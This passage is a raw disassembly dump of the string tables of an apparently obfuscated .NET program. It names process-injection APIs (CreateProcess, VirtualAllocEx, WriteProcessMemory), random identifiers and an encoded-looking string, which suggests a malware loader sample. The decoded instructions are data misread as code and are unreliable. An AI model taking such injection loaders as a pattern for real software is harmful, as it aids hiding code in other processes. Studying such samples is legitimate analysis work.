100030c4:	00 55 6c             	add    %dl,0x6c(%ebp)
100030c7:	52                   	push   %edx
100030c8:	66 73 41             	data16 jae 0x1000310c
100030cb:	31 38                	xor    %edi,(%eax)
100030cd:	31 4f 4d             	xor    %ecx,0x4d(%edi)
100030d0:	58                   	pop    %eax
100030d1:	33 37                	xor    (%edi),%esi
100030d3:	6e                   	outsb  %ds:(%esi),(%dx)
100030d4:	00 47 65             	add    %al,0x65(%edi)
100030d7:	74 46                	je     0x1000311f
100030d9:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
100030e0:	57 
100030e1:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
100030e8:	78 
100030e9:	74 65                	je     0x10003150
100030eb:	6e                   	outsb  %ds:(%esi),(%dx)
100030ec:	73 69                	jae    0x10003157
100030ee:	6f                   	outsl  %ds:(%esi),(%dx)
100030ef:	6e                   	outsb  %ds:(%esi),(%dx)
100030f0:	00 53 79             	add    %dl,0x79(%ebx)
100030f3:	73 74                	jae    0x10003169
100030f5:	65 6d                	gs insl (%dx),%es:(%edi)
100030f7:	2e 52                	cs push %edx
100030f9:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
100030fc:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
10003101:	6e                   	outsb  %ds:(%esi),(%dx)
10003102:	00 53 65             	add    %dl,0x65(%ebx)
10003105:	61                   	popa
10003106:	72 63                	jb     0x1000316b
10003108:	68 4f 70 74 69       	push   $0x6974704f
1000310d:	6f                   	outsl  %ds:(%esi),(%dx)
1000310e:	6e                   	outsb  %ds:(%esi),(%dx)
1000310f:	00 45 78             	add    %al,0x78(%ebp)
10003112:	63 65 70             	arpl   %esp,0x70(%ebp)
10003115:	74 69                	je     0x10003180
10003117:	6f                   	outsl  %ds:(%esi),(%dx)
10003118:	6e                   	outsb  %ds:(%esi),(%dx)
10003119:	00 5a 65             	add    %bl,0x65(%edx)
1000311c:	72 6f                	jb     0x1000318d
1000311e:	00 53 6c             	add    %dl,0x6c(%ebx)
10003121:	65 65 70 00          	gs gs jo 0x10003125
10003125:	58                   	pop    %eax
10003126:	4b                   	dec    %ebx
10003127:	78 6f                	js     0x10003198
10003129:	48                   	dec    %eax
1000312a:	79 76                	jns    0x100031a2
1000312c:	4a                   	dec    %edx
1000312d:	7a 52                	jp     0x10003181
1000312f:	5a                   	pop    %edx
10003130:	65 55                	gs push %ebp
10003132:	55                   	push   %ebp
10003133:	44                   	inc    %esp
10003134:	51                   	push   %ecx
10003135:	39 6f 70             	cmp    %ebp,0x70(%edi)
10003138:	53                   	push   %ebx
10003139:	71 00                	jno    0x1000313b
1000313b:	4b                   	dec    %ebx
1000313c:	66 5a                	pop    %dx
1000313e:	4f                   	dec    %edi
1000313f:	72 46                	jb     0x10003187
10003141:	36 4a                	ss dec %edx
10003143:	65 47                	gs inc %edi
10003145:	61                   	popa
10003146:	32 59 4d             	xor    0x4d(%ecx),%bl
10003149:	35 50 6f 35 6a       	xor    $0x6a356f50,%eax
1000314e:	71 00                	jno    0x10003150
10003150:	53                   	push   %ebx
10003151:	79 73                	jns    0x100031c6
10003153:	74 65                	je     0x100031ba
10003155:	6d                   	insl   (%dx),%es:(%edi)
10003156:	2e 4c                	cs dec %esp
10003158:	69 6e 71 00 51 5a 65 	imul   $0x655a5100,0x71(%esi),%ebp
1000315f:	62 54 4e 76          	bound  %edx,0x76(%esi,%ecx,2)
10003163:	55                   	push   %ebp
10003164:	39 6a 38             	cmp    %ebp,0x38(%edx)
10003167:	49                   	dec    %ecx
10003168:	50                   	push   %eax
10003169:	6c                   	insb   (%dx),%es:(%edi)
1000316a:	44                   	inc    %esp
1000316b:	4c                   	dec    %esp
1000316c:	30 59 75             	xor    %bl,0x75(%ecx)
1000316f:	7a 4c                	jp     0x100031bd
10003171:	6d                   	insl   (%dx),%es:(%edi)
10003172:	73 61                	jae    0x100031d5
10003174:	72 00                	jb     0x10003176
10003176:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
1000317b:	00 49 6e             	add    %cl,0x6e(%ecx)
1000317e:	74 50                	je     0x100031d0
10003180:	74 72                	je     0x100031f4
10003182:	00 59 4a             	add    %bl,0x4a(%ecx)
10003185:	77 46                	ja     0x100031cd
10003187:	6e                   	outsb  %ds:(%esi),(%dx)
10003188:	6d                   	insl   (%dx),%es:(%edi)
10003189:	43                   	inc    %ebx
1000318a:	53                   	push   %ebx
1000318b:	42                   	inc    %edx
1000318c:	36 57                	ss push %edi
1000318e:	54                   	push   %esp
1000318f:	53                   	push   %ebx
10003190:	79 31                	jns    0x100031c3
10003192:	6d                   	insl   (%dx),%es:(%edi)
10003193:	4a                   	dec    %edx
10003194:	52                   	push   %edx
10003195:	73 00                	jae    0x10003197
10003197:	53                   	push   %ebx
10003198:	79 73                	jns    0x1000320d
1000319a:	74 65                	je     0x10003201
1000319c:	6d                   	insl   (%dx),%es:(%edi)
1000319d:	2e 44                	cs inc %esp
1000319f:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
100031a6:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
100031ad:	74 65                	je     0x10003214
100031af:	6d                   	insl   (%dx),%es:(%edi)
100031b0:	2e 52                	cs push %edx
100031b2:	75 6e                	jne    0x10003222
100031b4:	74 69                	je     0x1000321f
100031b6:	6d                   	insl   (%dx),%es:(%edi)
100031b7:	65 2e 49             	gs cs dec %ecx
100031ba:	6e                   	outsb  %ds:(%esi),(%dx)
100031bb:	74 65                	je     0x10003222
100031bd:	72 6f                	jb     0x1000322e
100031bf:	70 53                	jo     0x10003214
100031c1:	65 72 76             	gs jb  0x1000323a
100031c4:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
100031cb:	73 74                	jae    0x10003241
100031cd:	65 6d                	gs insl (%dx),%es:(%edi)
100031cf:	2e 52                	cs push %edx
100031d1:	75 6e                	jne    0x10003241
100031d3:	74 69                	je     0x1000323e
100031d5:	6d                   	insl   (%dx),%es:(%edi)
100031d6:	65 2e 43             	gs cs inc %ebx
100031d9:	6f                   	outsl  %ds:(%esi),(%dx)
100031da:	6d                   	insl   (%dx),%es:(%edi)
100031db:	70 69                	jo     0x10003246
100031dd:	6c                   	insb   (%dx),%es:(%edi)
100031de:	65 72 53             	gs jb  0x10003234
100031e1:	65 72 76             	gs jb  0x1000325a
100031e4:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
100031eb:	62 75 67             	bound  %esi,0x67(%ebp)
100031ee:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
100031f5:	65 
100031f6:	73 00                	jae    0x100031f8
100031f8:	47                   	inc    %edi
100031f9:	65 74 46             	gs je  0x10003242
100031fc:	69 6c 65 73 00 43 6f 	imul   $0x6e6f4300,0x73(%ebp,%eiz,2),%ebp
10003203:	6e 
10003204:	74 61                	je     0x10003267
10003206:	69 6e 73 00 43 72 65 	imul   $0x65724300,0x73(%esi),%ebp
1000320d:	61                   	popa
1000320e:	74 65                	je     0x10003275
10003210:	50                   	push   %eax
10003211:	72 6f                	jb     0x10003282
10003213:	63 65 73             	arpl   %esp,0x73(%ebp)
10003216:	73 00                	jae    0x10003218
10003218:	4f                   	dec    %edi
10003219:	62 6a 65             	bound  %ebp,0x65(%edx)
1000321c:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
10003220:	6f                   	outsl  %ds:(%esi),(%dx)
10003221:	6e                   	outsb  %ds:(%esi),(%dx)
10003222:	76 65                	jbe    0x10003289
10003224:	72 74                	jb     0x1000329a
10003226:	00 4e 65             	add    %cl,0x65(%esi)
10003229:	78 74                	js     0x1000329f
1000322b:	00 53 79             	add    %dl,0x79(%ebx)
1000322e:	73 74                	jae    0x100032a4
10003230:	65 6d                	gs insl (%dx),%es:(%edi)
10003232:	2e 54                	cs push %esp
10003234:	65 78 74             	gs js  0x100032ab
10003237:	00 4d 51             	add    %cl,0x51(%ebp)
1000323a:	69 78 52 52 4c 33 48 	imul   $0x48334c52,0x52(%eax),%edi
10003241:	79 67                	jns    0x100032aa
10003243:	6a 36                	push   $0x36
10003245:	4f                   	dec    %edi
10003246:	51                   	push   %ecx
10003247:	75 00                	jne    0x10003249
10003249:	47                   	inc    %edi
1000324a:	64 49                	fs dec %ecx
1000324c:	4b                   	dec    %ebx
1000324d:	62 57 51             	bound  %edx,0x51(%edi)
10003250:	34 67                	xor    $0x67,%al
10003252:	59                   	pop    %ecx
10003253:	36 65 48             	ss gs dec %eax
10003256:	56                   	push   %esi
10003257:	35 41 74 49 53       	xor    $0x53497441,%eax
1000325c:	78 69                	js     0x100032c7
1000325e:	4a                   	dec    %edx
1000325f:	52                   	push   %edx
10003260:	44                   	inc    %esp
10003261:	77 00                	ja     0x10003263
10003263:	56                   	push   %esi
10003264:	69 72 74 75 61 6c 41 	imul   $0x416c6175,0x74(%edx),%esi
1000326b:	6c                   	insb   (%dx),%es:(%edi)
1000326c:	6c                   	insb   (%dx),%es:(%edi)
1000326d:	6f                   	outsl  %ds:(%esi),(%dx)
1000326e:	63 45 78             	arpl   %eax,0x78(%ebp)
10003271:	00 58 69             	add    %bl,0x69(%eax)
10003274:	44                   	inc    %esp
10003275:	54                   	push   %esp
10003276:	53                   	push   %ebx
10003277:	71 67                	jno    0x100032e0
10003279:	77 54                	ja     0x100032cf
1000327b:	35 75 6a 47 73       	xor    $0x73476a75,%eax
10003280:	6b 78 00 53          	imul   $0x53,0x0(%eax),%edi
10003284:	64 74 68             	fs je  0x100032ef
10003287:	77 4d                	ja     0x100032d6
10003289:	52                   	push   %edx
1000328a:	39 34 57             	cmp    %esi,(%edi,%edx,2)
1000328d:	56                   	push   %esi
1000328e:	6e                   	outsb  %ds:(%esi),(%dx)
1000328f:	58                   	pop    %eax
10003290:	79 00                	jns    0x10003292
10003292:	54                   	push   %esp
10003293:	6f                   	outsl  %ds:(%esi),(%dx)
10003294:	41                   	inc    %ecx
10003295:	72 72                	jb     0x10003309
10003297:	61                   	popa
10003298:	79 00                	jns    0x1000329a
1000329a:	57                   	push   %edi
1000329b:	72 69                	jb     0x10003306
1000329d:	74 65                	je     0x10003304
1000329f:	50                   	push   %eax
100032a0:	72 6f                	jb     0x10003311
100032a2:	63 65 73             	arpl   %esp,0x73(%ebp)
100032a5:	73 4d                	jae    0x100032f4
100032a7:	65 6d                	gs insl (%dx),%es:(%edi)
100032a9:	6f                   	outsl  %ds:(%esi),(%dx)
100032aa:	72 79                	jb     0x10003325
100032ac:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
100032b0:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
100032b5:	79 00                	jns    0x100032b7
100032b7:	6f                   	outsl  %ds:(%esi),(%dx)
100032b8:	70 5f                	jo     0x10003319
100032ba:	45                   	inc    %ebp
100032bb:	71 75                	jno    0x10003332
100032bd:	61                   	popa
100032be:	6c                   	insb   (%dx),%es:(%edi)
100032bf:	69 74 79 00 4f 72 76 	imul   $0x4876724f,0x0(%ecx,%edi,2),%esi
100032c6:	48 
100032c7:	63 46 32             	arpl   %eax,0x32(%esi)
100032ca:	50                   	push   %eax
100032cb:	51                   	push   %ecx
100032cc:	42                   	inc    %edx
100032cd:	6e                   	outsb  %ds:(%esi),(%dx)
100032ce:	41                   	inc    %ecx
100032cf:	6b 73 55 70          	imul   $0x70,0x55(%ebx),%esi
100032d3:	7a 00                	jp     0x100032d5
100032d5:	00 00                	add    %al,(%eax)
100032d7:	00 00                	add    %al,(%eax)
100032d9:	84 d1                	test   %dl,%cl
100032db:	54                   	push   %esp
100032dc:	00 47 00             	add    %al,0x0(%edi)
100032df:	52                   	push   %edx
100032e0:	00 34 00             	add    %dh,(%eax,%eax,1)
100032e3:	54                   	push   %esp
100032e4:	00 6b 00             	add    %ch,0x0(%ebx)
100032e7:	52                   	push   %edx
100032e8:	00 51 00             	add    %dl,0x0(%ecx)
100032eb:	57                   	push   %edi
100032ec:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
100032f0:	00 4f 00             	add    %cl,0x0(%edi)
100032f3:	63 00                	arpl   %eax,(%eax)
100032f5:	46                   	inc    %esi
100032f6:	00 4a 00             	add    %cl,0x0(%edx)
100032f9:	74 00                	je     0x100032fb
100032fb:	52                   	push   %edx
100032fc:	00 6b 00             	add    %ch,0x0(%ebx)
100032ff:	78 00                	js     0x10003301
10003301:	6b 00 65             	imul   $0x65,(%eax),%eax
10003304:	00 45 00             	add    %al,0x0(%ebp)
10003307:	35 00 45 00 55       	xor    $0x55004500,%eax
1000330c:	00 46 00             	add    %al,0x0(%esi)
1000330f:	67 00 35             	add    %dh,(%di)
10003312:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
10003316:	00 42 00             	add    %al,0x0(%edx)
10003319:	4d                   	dec    %ebp
1000331a:	00 5a 00             	add    %bl,0x0(%edx)
1000331d:	48                   	dec    %eax
1000331e:	00 68 00             	add    %ch,0x0(%eax)
10003321:	4f                   	dec    %edi
10003322:	00 52 00             	add    %dl,0x0(%edx)
10003325:	46                   	inc    %esi
10003326:	00 42 00             	add    %al,0x0(%edx)
10003329:	59                   	pop    %ecx
1000332a:	00 4f 00             	add    %cl,0x0(%edi)
1000332d:	55                   	push   %ebp
1000332e:	00 35 00 77 00 63    	add    %dh,0x63007700
10003334:	00 47 00             	add    %al,0x0(%edi)
10003337:	4a                   	dec    %edx
10003338:	00 48 00             	add    %cl,0x0(%eax)
1000333b:	54                   	push   %esp
1000333c:	00 47 00             	add    %al,0x0(%edi)
1000333f:	52                   	push   %edx
10003340:	00 34 00             	add    %dh,(%eax,%eax,1)
10003343:	54                   	push   %esp
10003344:	00 6b 00             	add    %ch,0x0(%ebx)
10003347:	52                   	push   %edx
10003348:	00 51 00             	add    %dl,0x0(%ecx)
1000334b:	57                   	push   %edi
1000334c:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
10003350:	00 4f 00             	add    %cl,0x0(%edi)
10003353:	63 00                	arpl   %eax,(%eax)
10003355:	45                   	inc    %ebp
10003356:	00 78 00             	add    %bh,0x0(%eax)
10003359:	6b 00 65             	imul   $0x65,(%eax),%eax
1000335c:	00 45 00             	add    %al,0x0(%ebp)
1000335f:	35 00 45 00 55       	xor    $0x55004500,%eax
10003364:	00 46 00             	add    %al,0x0(%esi)
10003367:	67 00 35             	add    %dh,(%di)
1000336a:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
1000336e:	00 42 00             	add    %al,0x0(%edx)
10003371:	57                   	push   %edi
10003372:	00 61 00             	add    %ah,0x0(%ecx)
10003375:	30 00                	xor    %al,(%eax)
10003377:	6c                   	insb   (%dx),%es:(%edi)
10003378:	00 4d 00             	add    %cl,0x0(%ebp)
1000337b:	5a                   	pop    %edx
1000337c:	00 48 00             	add    %cl,0x0(%eax)
1000337f:	68 00 4f 00 52       	push   $0x52004f00
10003384:	00 46 00             	add    %al,0x0(%esi)
10003387:	42                   	inc    %edx
10003388:	00 59 00             	add    %bl,0x0(%ecx)
1000338b:	4f                   	dec    %edi
1000338c:	00 55 00             	add    %dl,0x0(%ebp)
1000338f:	35 00 77 00 54       	xor    $0x54007700,%eax
10003394:	00 47 00             	add    %al,0x0(%edi)
10003397:	52                   	push   %edx
10003398:	00 34 00             	add    %dh,(%eax,%eax,1)
1000339b:	54                   	push   %esp
1000339c:	00 6b 00             	add    %ch,0x0(%ebx)
1000339f:	52                   	push   %edx
100033a0:	00 51 00             	add    %dl,0x0(%ecx)
100033a3:	57                   	push   %edi
100033a4:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
100033a8:	00 4f 00             	add    %cl,0x0(%edi)
100033ab:	63 00                	arpl   %eax,(%eax)
100033ad:	45                   	inc    %ebp
100033ae:	00 68 00             	add    %ch,0x0(%eax)
100033b1:	53                   	push   %ebx
100033b2:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
100033b6:	00 78 00             	add    %bh,0x0(%eax)
100033b9:	6b 00 65             	imul   $0x65,(%eax),%eax
100033bc:	00 45 00             	add    %al,0x0(%ebp)
100033bf:	35 00 45 00 55       	xor    $0x55004500,%eax
100033c4:	00 46 00             	add    %al,0x0(%esi)
100033c7:	67 00 35             	add    %dh,(%di)
100033ca:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
100033ce:	00 42 00             	add    %al,0x0(%edx)
100033d1:	4d                   	dec    %ebp
100033d2:	00 5a 00             	add    %bl,0x0(%edx)
100033d5:	48                   	dec    %eax
100033d6:	00 68 00             	add    %ch,0x0(%eax)
100033d9:	4f                   	dec    %edi
100033da:	00 52 00             	add    %dl,0x0(%edx)
100033dd:	46                   	inc    %esi
100033de:	00 42 00             	add    %al,0x0(%edx)
100033e1:	59                   	pop    %ecx
100033e2:	00 4f 00             	add    %cl,0x0(%edi)
100033e5:	55                   	push   %ebp
100033e6:	00 35 00 77 00 53    	add    %dh,0x53007700
100033ec:	00 55 00             	add    %dl,0x0(%ebp)
100033ef:	64 00 47 00          	add    %al,%fs:0x0(%edi)
100033f3:	54                   	push   %esp
100033f4:	00 47 00             	add    %al,0x0(%edi)
100033f7:	52                   	push   %edx
100033f8:	00 34 00             	add    %dh,(%eax,%eax,1)
100033fb:	54                   	push   %esp
100033fc:	00 6b 00             	add    %ch,0x0(%ebx)
100033ff:	52                   	push   %edx
10003400:	00 51 00             	add    %dl,0x0(%ecx)
10003403:	57                   	push   %edi
10003404:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
10003408:	00 4f 00             	add    %cl,0x0(%edi)
1000340b:	63 00                	arpl   %eax,(%eax)
1000340d:	45                   	inc    %ebp
1000340e:	00 78 00             	add    %bh,0x0(%eax)
10003411:	6b 00 65             	imul   $0x65,(%eax),%eax
10003414:	00 45 00             	add    %al,0x0(%ebp)
10003417:	35 00 45 00 55       	xor    $0x55004500,%eax
1000341c:	00 46 00             	add    %al,0x0(%esi)
1000341f:	67 00 35             	add    %dh,(%di)
10003422:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
10003426:	00 42 00             	add    %al,0x0(%edx)
10003429:	7a 00                	jp     0x1000342b
1000342b:	59                   	pop    %ecx
1000342c:	00 6b 00             	add    %ch,0x0(%ebx)
1000342f:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
10003433:	5a                   	pop    %edx
10003434:	00 48 00             	add    %cl,0x0(%eax)
10003437:	68 00 4f 00 52       	push   $0x52004f00
1000343c:	00 46 00             	add    %al,0x0(%esi)
1000343f:	42                   	inc    %edx
10003440:	00 59 00             	add    %bl,0x0(%ecx)
10003443:	4f                   	dec    %edi
10003444:	00 55 00             	add    %dl,0x0(%ebp)
10003447:	35 00 77 00 54       	xor    $0x54007700,%eax
1000344c:	00 47 00             	add    %al,0x0(%edi)
1000344f:	52                   	push   %edx
10003450:	00 34 00             	add    %dh,(%eax,%eax,1)
10003453:	54                   	push   %esp
10003454:	00 6b 00             	add    %ch,0x0(%ebx)
10003457:	52                   	push   %edx
10003458:	00 51 00             	add    %dl,0x0(%ecx)
1000345b:	57                   	push   %edi
1000345c:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
10003460:	00 4f 00             	add    %cl,0x0(%edi)
10003463:	63 00                	arpl   %eax,(%eax)
10003465:	44                   	inc    %esp
10003466:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
1000346a:	00 57 00             	add    %dl,0x0(%edi)
1000346d:	55                   	push   %ebp
1000346e:	00 78 00             	add    %bh,0x0(%eax)
10003471:	6b 00 65             	imul   $0x65,(%eax),%eax
10003474:	00 45 00             	add    %al,0x0(%ebp)
10003477:	35 00 45 00 55       	xor    $0x55004500,%eax
1000347c:	00 46 00             	add    %al,0x0(%esi)
1000347f:	67 00 35             	add    %dh,(%di)
10003482:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
10003486:	00 42 00             	add    %al,0x0(%edx)
10003489:	4d                   	dec    %ebp
1000348a:	00 5a 00             	add    %bl,0x0(%edx)
1000348d:	48                   	dec    %eax
1000348e:	00 68 00             	add    %ch,0x0(%eax)
10003491:	4f                   	dec    %edi
10003492:	00 52 00             	add    %dl,0x0(%edx)
10003495:	46                   	inc    %esi
10003496:	00 42 00             	add    %al,0x0(%edx)
10003499:	59                   	pop    %ecx
1000349a:	00 4f 00             	add    %cl,0x0(%edi)
1000349d:	55                   	push   %ebp
1000349e:	00 35 00 77 00 57    	add    %dh,0x57007700
100034a4:	00 46 00             	add    %al,0x0(%esi)
100034a7:	4a                   	dec    %edx
100034a8:	00 73 00             	add    %dh,0x0(%ebx)
100034ab:	54                   	push   %esp
100034ac:	00 47 00             	add    %al,0x0(%edi)
100034af:	52                   	push   %edx
100034b0:	00 34 00             	add    %dh,(%eax,%eax,1)
100034b3:	54                   	push   %esp
100034b4:	00 6b 00             	add    %ch,0x0(%ebx)
100034b7:	52                   	push   %edx
100034b8:	00 51 00             	add    %dl,0x0(%ecx)
100034bb:	57                   	push   %edi
100034bc:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
100034c0:	00 4f 00             	add    %cl,0x0(%edi)
100034c3:	63 00                	arpl   %eax,(%eax)
100034c5:	45                   	inc    %ebp
100034c6:	00 78 00             	add    %bh,0x0(%eax)
100034c9:	6b 00 65             	imul   $0x65,(%eax),%eax
100034cc:	00 45 00             	add    %al,0x0(%ebp)
100034cf:	35 00 45 00 55       	xor    $0x55004500,%eax
100034d4:	00 46 00             	add    %al,0x0(%esi)
100034d7:	67 00 35             	add    %dh,(%di)
100034da:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
100034de:	00 42 00             	add    %al,0x0(%edx)
100034e1:	4a                   	dec    %edx
100034e2:	00 52 00             	add    %dl,0x0(%edx)
100034e5:	7a 00                	jp     0x100034e7
100034e7:	46                   	inc    %esi
100034e8:	00 4d 00             	add    %cl,0x0(%ebp)
100034eb:	5a                   	pop    %edx
100034ec:	00 48 00             	add    %cl,0x0(%eax)
100034ef:	68 00 4f 00 52       	push   $0x52004f00
100034f4:	00 46 00             	add    %al,0x0(%esi)
100034f7:	42                   	inc    %edx
100034f8:	00 59 00             	add    %bl,0x0(%ecx)
100034fb:	4f                   	dec    %edi
100034fc:	00 55 00             	add    %dl,0x0(%ebp)
100034ff:	35 00 77 00 54       	xor    $0x54007700,%eax
10003504:	00 47 00             	add    %al,0x0(%edi)
10003507:	52                   	push   %edx
10003508:	00 34 00             	add    %dh,(%eax,%eax,1)
1000350b:	54                   	push   %esp
1000350c:	00 6b 00             	add    %ch,0x0(%ebx)
1000350f:	52                   	push   %edx
10003510:	00 51 00             	add    %dl,0x0(%ecx)
10003513:	57                   	push   %edi
10003514:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
10003518:	00 4f 00             	add    %cl,0x0(%edi)
1000351b:	63 00                	arpl   %eax,(%eax)
1000351d:	47                   	inc    %edi
1000351e:	00 78 00             	add    %bh,0x0(%eax)
10003521:	69 00 56 00 30 00    	imul   $0x300056,(%eax),%eax
10003527:	78 00                	js     0x10003529
10003529:	6b 00 65             	imul   $0x65,(%eax),%eax
1000352c:	00 45 00             	add    %al,0x0(%ebp)
1000352f:	35 00 45 00 55       	xor    $0x55004500,%eax
10003534:	00 46 00             	add    %al,0x0(%esi)
10003537:	67 00 35             	add    %dh,(%di)
1000353a:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
1000353e:	00 42 00             	add    %al,0x0(%edx)
10003541:	4d                   	dec    %ebp
10003542:	00 5a 00             	add    %bl,0x0(%edx)
10003545:	48                   	dec    %eax
10003546:	00 68 00             	add    %ch,0x0(%eax)
10003549:	4f                   	dec    %edi
1000354a:	00 52 00             	add    %dl,0x0(%edx)
1000354d:	46                   	inc    %esi
1000354e:	00 42 00             	add    %al,0x0(%edx)
10003551:	59                   	pop    %ecx
10003552:	00 4f 00             	add    %cl,0x0(%edi)
10003555:	55                   	push   %ebp
10003556:	00 35 00 77 00 4f    	add    %dh,0x4f007700
1000355c:	00 58 00             	add    %bl,0x0(%eax)
1000355f:	6c                   	insb   (%dx),%es:(%edi)
10003560:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
10003564:	00 47 00             	add    %al,0x0(%edi)
10003567:	52                   	push   %edx
10003568:	00 34 00             	add    %dh,(%eax,%eax,1)
1000356b:	54                   	push   %esp
1000356c:	00 6b 00             	add    %ch,0x0(%ebx)
1000356f:	52                   	push   %edx
10003570:	00 51 00             	add    %dl,0x0(%ecx)
10003573:	57                   	push   %edi
10003574:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
10003578:	00 4f 00             	add    %cl,0x0(%edi)
1000357b:	63 00                	arpl   %eax,(%eax)
1000357d:	45                   	inc    %ebp
1000357e:	00 78 00             	add    %bh,0x0(%eax)
10003581:	6b 00 65             	imul   $0x65,(%eax),%eax
10003584:	00 45 00             	add    %al,0x0(%ebp)
10003587:	35 00 45 00 55       	xor    $0x55004500,%eax
1000358c:	00 46 00             	add    %al,0x0(%esi)
1000358f:	67 00 35             	add    %dh,(%di)
10003592:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
10003596:	00 42 00             	add    %al,0x0(%edx)
10003599:	54                   	push   %esp
1000359a:	00 51 00             	add    %dl,0x0(%ecx)
1000359d:	6e                   	outsb  %ds:(%esi),(%dx)
1000359e:	00 42 00             	add    %al,0x0(%edx)
100035a1:	4d                   	dec    %ebp
100035a2:	00 5a 00             	add    %bl,0x0(%edx)
100035a5:	48                   	dec    %eax
100035a6:	00 68 00             	add    %ch,0x0(%eax)
100035a9:	4f                   	dec    %edi
100035aa:	00 52 00             	add    %dl,0x0(%edx)
100035ad:	46                   	inc    %esi
100035ae:	00 42 00             	add    %al,0x0(%edx)
100035b1:	59                   	pop    %ecx
100035b2:	00 4f 00             	add    %cl,0x0(%edi)
100035b5:	55                   	push   %ebp
100035b6:	00 35 00 77 00 54    	add    %dh,0x54007700
100035bc:	00 47 00             	add    %al,0x0(%edi)
100035bf:	52                   	push   %edx
100035c0:	00 34 00             	add    %dh,(%eax,%eax,1)
100035c3:	54                   	push   %esp
100035c4:	00 6b 00             	add    %ch,0x0(%ebx)
100035c7:	52                   	push   %edx
100035c8:	00 51 00             	add    %dl,0x0(%ecx)
100035cb:	57                   	push   %edi
100035cc:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
100035d0:	00 4f 00             	add    %cl,0x0(%edi)
100035d3:	63 00                	arpl   %eax,(%eax)
100035d5:	47                   	inc    %edi
100035d6:	00 4a 00             	add    %cl,0x0(%edx)
100035d9:	70 00                	jo     0x100035db
100035db:	51                   	push   %ecx
100035dc:	00 6b 00             	add    %ch,0x0(%ebx)
100035df:	78 00                	js     0x100035e1
100035e1:	6b 00 65             	imul   $0x65,(%eax),%eax
100035e4:	00 45 00             	add    %al,0x0(%ebp)
100035e7:	35 00 45 00 55       	xor    $0x55004500,%eax
100035ec:	00 46 00             	add    %al,0x0(%esi)
100035ef:	67 00 35             	add    %dh,(%di)
100035f2:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
100035f6:	00 42 00             	add    %al,0x0(%edx)
100035f9:	4d                   	dec    %ebp
100035fa:	00 5a 00             	add    %bl,0x0(%edx)
100035fd:	48                   	dec    %eax
100035fe:	00 68 00             	add    %ch,0x0(%eax)
10003601:	4f                   	dec    %edi
10003602:	00 52 00             	add    %dl,0x0(%edx)
10003605:	46                   	inc    %esi
10003606:	00 42 00             	add    %al,0x0(%edx)
10003609:	59                   	pop    %ecx
1000360a:	00 4f 00             	add    %cl,0x0(%edi)
1000360d:	55                   	push   %ebp
1000360e:	00 35 00 77 00 4d    	add    %dh,0x4d007700
10003614:	00 46 00             	add    %al,0x0(%esi)
10003617:	6c                   	insb   (%dx),%es:(%edi)
10003618:	00 59 00             	add    %bl,0x0(%ecx)
1000361b:	54                   	push   %esp
1000361c:	00 47 00             	add    %al,0x0(%edi)
1000361f:	52                   	push   %edx
10003620:	00 34 00             	add    %dh,(%eax,%eax,1)
10003623:	54                   	push   %esp
10003624:	00 6b 00             	add    %ch,0x0(%ebx)
10003627:	52                   	push   %edx
10003628:	00 51 00             	add    %dl,0x0(%ecx)
1000362b:	57                   	push   %edi
1000362c:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
10003630:	00 4f 00             	add    %cl,0x0(%edi)
10003633:	63 00                	arpl   %eax,(%eax)
10003635:	45                   	inc    %ebp
10003636:	00 78 00             	add    %bh,0x0(%eax)
10003639:	6b 00 65             	imul   $0x65,(%eax),%eax
1000363c:	00 45 00             	add    %al,0x0(%ebp)
1000363f:	35 00 45 00 55       	xor    $0x55004500,%eax
10003644:	00 46 00             	add    %al,0x0(%esi)
10003647:	67 00 35             	add    %dh,(%di)
1000364a:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
1000364e:	00 42 00             	add    %al,0x0(%edx)
10003651:	4b                   	dec    %ebx
10003652:	00 62 00             	add    %ah,0x0(%edx)
10003655:	6c                   	insb   (%dx),%es:(%edi)
10003656:	00 70 00             	add    %dh,0x0(%eax)
10003659:	4d                   	dec    %ebp
1000365a:	00 5a 00             	add    %bl,0x0(%edx)
1000365d:	48                   	dec    %eax
1000365e:	00 68 00             	add    %ch,0x0(%eax)
10003661:	4f                   	dec    %edi
10003662:	00 52 00             	add    %dl,0x0(%edx)
10003665:	46                   	inc    %esi
10003666:	00 42 00             	add    %al,0x0(%edx)
10003669:	59                   	pop    %ecx
